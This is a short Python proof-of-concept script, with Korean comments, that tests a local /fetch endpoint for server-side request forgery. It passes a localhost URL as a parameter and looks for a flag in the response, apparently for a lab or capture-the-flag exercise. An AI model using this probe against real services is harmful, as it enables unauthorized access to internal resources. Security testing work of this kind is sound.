# SSRF PoC - poc.py
import requests

TARGET = "http://localhost:3000"
ENDPOINT = "/fetch"
FULL_URL = TARGET + ENDPOINT

# SSRF 테스트용 내부 주소
payload = {
    "url": "http://localhost:3000"
}

def run_poc():
    print(f"[+] Sending payload to {FULL_URL}")
    res = requests.get(FULL_URL, params=payload)

    if "Use /fetch" in res.text or "FLAG" in res.text:
        print("[+] PoC 성공: SSRF 가능!")
        print(res.text[:300])
    else:
        print("[-] PoC 실패: 취약점 없음 또는 필터링됨")

if __name__ == "__main__":
    run_poc()
